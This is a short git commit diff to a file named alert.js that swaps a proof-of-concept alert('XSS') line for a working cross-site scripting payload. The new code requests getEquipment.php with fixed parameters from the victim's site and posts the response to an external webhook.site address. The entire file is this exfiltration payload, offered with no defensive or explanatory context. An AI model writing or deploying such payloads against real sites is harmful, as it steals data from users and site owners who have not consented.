d9cbfd7f55da30d39966eac7f8c57b21e906c13f
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-04-28 11:46:40 +0200

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,1 +1,7 @@
-alert('XSS');
+fetch('getEquipment.php?usine=814&etage=1')
+  .then(r => r.text())
+  .then(d => fetch('https://webhook.site/a2e6bdea-4569-4394-821d-ee8a0efd5f41', {
+    method: 'POST',
+    headers: {'Content-Type': 'text/plain'},
+    body: d
+  }));
